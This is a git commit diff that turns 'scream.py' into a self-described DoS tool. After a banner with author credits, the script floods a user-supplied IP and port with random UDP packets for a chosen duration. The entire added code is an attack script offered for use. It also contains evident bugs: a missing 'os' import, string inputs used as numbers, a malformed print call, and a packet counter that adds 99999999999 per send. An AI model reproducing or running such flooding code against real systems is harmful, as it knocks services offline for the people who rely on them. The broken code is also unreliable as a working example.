f744900358c78aac9fdf2160ca3e94b2e2f9e2ed
GeneralSony <55324538+Generalsony@users.noreply.github.com>
2019-10-06 22:03:31 +0200

    Update scream.py

--- scream.py
+++ scream.py
@@ -1,6 +1,51 @@
-#!/usr/bin/env python2
+import sys
+import time
+import socket
+import random
+from time import sleep
 
-def logo():
-	pass
+s='[+]Coded By General Sony & Knassar702[+]'
+for c in s + '\n':
+    sys.stdout.write(c)
+    sys.stdout.flush()
+    sleep (10. /90)
+s='[+]Beta Version!!![+]'
+for c in s + '\n':
+    sys.stdout.write(c)
+    sys.stdout.flush()
+    sleep (10. /90)
+s='[~]https://www.facebook.com/GeneralSony666[~]'
+for c in s + '\n':
+    sys.stdout.write(c)
+    sys.stdout.flush()
+    sleep (10. /90)
+s='Version : 0.1'
+for c in s + '\n':
+    sys.stdout.write(c)
+    sys.stdout.flush()
+    sleep (10. /90)
+    
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
+bytes = random._urandom(1024)
 
+os.system("clear")
+print ("DoS Tool By [NONScream](General Sony)")
+print (" ")
+ip =input("Target IP: ")
+port = input("Port: ")
+dur= input("Time: ")
+timeout = time.time() + dur
+sent = 0
+
+while True:
+        try:
+                if time.time() > timeout:
+                        break
+                else:
+                        pass
+                sock.sendto(bytes,(ip, port))
+                sent = sent + 99999999999
+                print("Sending %s Packets To %s Via Port %s") , sent, ip, port
+        except KeyboardInterrupt:
+               sys.exit()
